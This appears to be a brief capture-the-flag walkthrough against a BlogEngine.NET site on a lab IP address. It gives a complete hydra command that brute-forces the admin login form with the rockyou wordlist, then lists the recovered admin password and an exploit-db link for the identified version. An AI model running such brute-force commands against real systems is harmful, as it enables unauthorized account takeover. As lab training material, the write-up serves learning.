We can find a login page at http://10.10.45.183/Account/login.aspx?ReturnURL=/admin/

We can brute force with with hydra using 'admin' as username


```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.45.183 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=ZGIcuAqu68X9ZUhhyKG1HNKFogXnvdZKhK9UhLDrA1%2BgGMrAK4c3POLnTClHtde8mW3WGWoIsPnimyFHLqesS9dKYi3KCfl2N4GhE4nx2ba%2FtHxiBJVVFsGhqswT%2F4LSCn52IgY%2BDSR59abFCW8u9eP9MW6Un3IiE63pHXuF2b%2Bpc93foFBWMS02ktfS7BzE8UBgU1Va69Zbj%2F7Syadib1cuK1NA8VsCB2iHfkQXUGupU0dg6ZmR1X3fLFC9Ax5XgSgvKpcxGhr74TE4suX852iChdEGnKGQwB%2BxCmAw6a7t0dXZpeo7dW92xPnSdtOiUzk%2Fj4w7NPK%2B1QSEuHCHulho1ZHd5qK2%2BybOsjjKCM82HZTc&__EVENTVALIDATION=8xce1nP%2Beq03DHDevvD8g5zC2dzi%2Fpxl85NW%2BJMm%2FX4cPjLLglabvFmdsRzdZNRYSR5DQtPlc3ejO2e00lCu0oKRCvbSXbxXd%2B5ftDILG33ak9kjDnN3XUda5LAnU7bKwdGDrVWJZ0S6ztBrUNeZWXSMy7xTDqWK5WoUyQk1fn%2B9KV1d&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

We find our password and log into the website:
`login: admin   password: 1qaz2wsx`


---

We enumerate blogengine.net version number by going to the ABOUT page and find this CVE:

https://www.exploit-db.com/exploits/46353

---

